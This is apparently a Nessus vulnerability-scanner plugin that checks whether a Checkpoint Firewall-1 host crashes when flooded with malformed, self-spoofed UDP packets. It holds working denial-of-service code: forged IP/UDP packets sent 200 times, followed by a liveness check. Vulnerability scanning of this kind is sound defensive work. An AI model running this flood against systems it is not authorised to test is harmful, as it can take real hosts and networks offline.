#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GNU Public Licence
#

if(description)
{
 script_id(11905);
 script_bugtraq_id(1419);
 script_version ("$Revision: 1.4 $");

 name["english"] = "Checkpoint Firewall-1 UDP denial of service";
 script_name(english:name["english"]);
 
 desc["english"] = "
The machine (or a router on the way) crashed when it was flooded by 
incorrect UDP packets.
This attack was known to work against Firewall-1 3.0, 4.0 or 4.1

An attacker may use this flaw to shut down this server, thus 
preventing you from working properly. 

Solution : if this is a FW-1, enable the antispoofing rule;
	otherwise, contact your software vendor for a patch.

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Flood the target with incorrect UDP packets";
 script_summary(english:summary["english"]);
 
 if (ACT_FLOOD) script_category(ACT_FLOOD);
 else		script_category(ACT_KILL_HOST);
 
 script_copyright(english:"This script is Copyright (C) 2003 Michel Arboi");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);

 exit(0);
}

#

include("global_settings.inc");

if ( report_paranoia < 2 ) exit(0); #FP

id = rand() % 65535 + 1;
sp = rand() % 65535 + 1;
dp = rand() % 65535 + 1;

start_denial();

ip = forge_ip_packet(ip_v:4, ip_hl:5, ip_tos:0, ip_off: 0,
                     ip_p:IPPROTO_UDP, ip_id: id, ip_ttl:0x40,
	     	        ip_src: get_host_ip());
udp = forge_udp_packet(ip:ip, uh_sport: sp, uh_dport: dp, uh_ulen: 8+1, data: "X");

send_packet(udp, pcap_active: 0) x 200;

alive = end_denial();
if(!alive)
{
	security_hole();
	set_kb_item(name:"Host/dead", value:TRUE);
}

